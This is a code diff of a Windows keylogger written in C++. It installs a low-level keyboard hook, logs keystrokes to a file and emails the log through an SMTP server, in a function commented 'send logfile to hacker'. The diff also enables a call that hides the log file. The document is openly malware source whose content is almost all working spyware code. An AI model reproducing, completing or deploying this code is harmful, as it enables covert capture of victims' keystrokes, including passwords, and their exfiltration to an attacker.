@@ -4,7 +4,6 @@
 #define MAX_FILE_SIZE 20000
 #include "stdafx.h"
 #include "filemanager.h"
-// #include "mailmanager.h"
 #include "winmanager.h"
 #include "KeyLogger.h"
 using namespace std;
@@ -14,7 +13,7 @@ FILE* f;
 HHOOK hKeyboardHook;
 static int keysPressed = 0;
 
-void sendmail() {
+void sendmail() {	// send logfile to hacker
 	CkMailMan mailman;
 
 	mailman.put_SmtpHost("smtp.gmail.com");
@@ -50,7 +49,7 @@ void sendmail() {
 	cout << "Mail with attachments sent!" << "\r\n";
 }
 
-DWORD WINAPI Keylogger(LPVOID lpParm) {
+DWORD WINAPI Keylogger(LPVOID lpParm) {		// keylogger loop
     HINSTANCE hins;
     hins = GetModuleHandle(NULL);
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Hook, hins, 0);
@@ -96,7 +95,7 @@ LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keyst
 			fprintf(f, "\n");
 		}
 		keysPressed++;
-		// hidefile(workFullPath);
+		hidefile(workFullPath);
 		fclose(f);
 	}
 	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
